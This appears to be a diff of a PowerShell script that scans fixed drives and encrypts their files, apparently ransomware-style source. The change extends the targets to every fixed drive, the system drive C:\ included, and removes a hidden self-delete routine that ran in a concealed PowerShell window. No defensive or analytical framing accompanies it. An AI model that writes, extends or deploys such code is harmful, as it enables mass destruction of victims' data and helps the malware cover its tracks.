@@ -43,11 +43,18 @@ function Encrypt-File {
 }
 
 # Scan all non-C fixed drives
+# $Drives = [System.IO.DriveInfo]::GetDrives() | Where-Object {
+#     $_.IsReady -and
+#     $_.DriveType -eq 'Fixed' -and
+#     $_.Name -ne "C:\"
+# }
+
+# Include ALL fixed drives, including C:\
 $Drives = [System.IO.DriveInfo]::GetDrives() | Where-Object {
     $_.IsReady -and
-    $_.DriveType -eq 'Fixed' -and
-    $_.Name -ne "C:\"
+    $_.DriveType -eq 'Fixed'
 }
+
 
 foreach ($Drive in $Drives) {
     Write-Host "`nScanning drive: $($Drive.Name)" -ForegroundColor Cyan
@@ -67,9 +74,3 @@ foreach ($Drive in $Drives) {
 }
 
 Write-Host "`nEncryption completed." -ForegroundColor Yellow
-
-# ===== Self-Delete Mechanism =====
-$ScriptPath = $MyInvocation.MyCommand.Path
-$Cmd = "Start-Sleep -Seconds 3; Remove-Item -Path `"$ScriptPath`" -Force"
-Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$Cmd"
-Write-Host "Script will now delete itself..." -ForegroundColor Red
